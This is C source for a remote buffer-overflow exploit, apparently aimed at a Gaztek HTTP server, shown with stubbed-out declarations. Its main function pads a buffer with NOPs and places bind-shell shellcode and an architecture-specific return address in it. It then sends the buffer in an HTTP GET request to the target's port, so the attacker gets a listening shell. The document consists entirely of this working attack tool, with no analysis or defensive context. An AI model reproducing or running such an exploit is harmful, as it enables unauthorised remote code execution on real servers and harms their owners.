
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int target ;
struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {int sin_zero; TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct TYPE_4__ {int adjusted_buf; long addr; int id; char* os; } ;


 int AF_INET ;
 int ARCH_NUMBER ;
 int BIND_PORT ;
 int GAZTEK_PORT ;
 int MIN_BUFFER_SIZE ;
 int NOP ;
 int SOCK_STREAM ;
 TYPE_2__* architectures ;
 int atoi (char*) ;
 char* bindshell ;
 int bzero (int *,int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int get_ban (char*) ;
 int getopt (int,char**,char*) ;
 int htons (int ) ;
 int inet_addr (char*) ;
 char* malloc (int) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;
 int synops (char**) ;
 int write (int,char*,int) ;

main(int argc, char *argv[])
{
   int c, c_size, ip_lenght, arch_id, sock_fd, errflg=0, ban_chk=0, exp_flg=0;
   char *addr, *get_buf, *get_buf_str;
   long ret;

   extern char *optarg;
   extern int optind, optopt;

   struct sockaddr_in target;

   if(argc == 1)
      synops(argv);

   while((c = getopt(argc, argv, "b:d:")) != -1)
   {
      switch(c)
      {
         case 'b':
            addr = malloc(strlen(optarg));
            strcpy(addr, optarg);
            ban_chk++;
            break;
         case 'd':
            if(!(argv[optind]))
               errflg++;
            if(!(argv[optind+1]))
               errflg++;
            if(errflg == 0)
            {
               if((arch_id = atoi(optarg)) < 0 || (arch_id = atoi(optarg)) > (ARCH_NUMBER-1))
               {
                  printf("Invalid architecture id.\n");
                  exit(-1);
               }

               if((inet_addr(argv[optind])) != -1)
                  ip_lenght = strlen(argv[optind+1]);
               else
               {
                  printf("\"%s\" is an invalid ip address.\n", argv[optind]);
                  exit(-1);
               }
               addr = malloc(strlen(argv[optind+1]));
               strcpy(addr, argv[optind+1]+1);
               exp_flg++;
            }

            break;
         case ':':
            errflg++;
            break;
         case '?':
            errflg++;
      }
   }

   if(errflg > 0)
      synops(argv);


   if(ban_chk > 0)
      get_ban(addr);

   if(!(exp_flg))
      synops(argv);
   c_size = ((MIN_BUFFER_SIZE+15-ip_lenght-4-2)+(architectures[arch_id].adjusted_buf));

   c_size = c_size+1;


   get_buf = malloc(c_size);

   get_buf_str = malloc((c_size+4+2));

   memset(get_buf, NOP, c_size);
   memcpy(get_buf+(c_size-1-4-strlen(bindshell)), bindshell, strlen(bindshell));
   *(long*)&get_buf[c_size-4-1] = architectures[arch_id].addr;
   get_buf[c_size-1] = '\0';


   sprintf(get_buf_str,"GET %s\n\n", get_buf);


   printf("target: %s\n", addr);
   printf("arch id: %d, %s, 0x%x\n", architectures[arch_id].id, architectures[arch_id].os, architectures[arch_id].addr);
   printf("ip size: %d bytes\n", ip_lenght);
   printf("Adjust: %d bytes\n", architectures[arch_id].adjusted_buf);
   printf("buffer size: %d bytes\n", strlen(get_buf_str));
   printf("bind shellcode size: %d bytes\n", strlen(bindshell));
   printf("bind shell tcp port: %d\n", BIND_PORT);
   printf("Injecting code at 0x%x...\n", architectures[arch_id].addr);



        if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 1)
        {
                printf("socket() error.\n");
                exit(-1);
        }

        target.sin_family = AF_INET;
        target.sin_port = htons(GAZTEK_PORT);

        if((target.sin_addr.s_addr = inet_addr(addr)) == -1)
        {
                printf("\"%s\" is an invalid ip address.\n", addr);
                exit(-1);
        }

        bzero(&(target.sin_zero), 8);

        if((connect(sock_fd, (struct sockaddr *)&target, sizeof(target))) == -1)
   {
                printf("connect() error.\n");
                exit(-1);
        }

        if((write(sock_fd, get_buf_str, strlen(get_buf_str))) == -1)
        {
                printf("write() error.\n");
                exit(-1);
        }

   printf("Done!\n");

return 0;
}
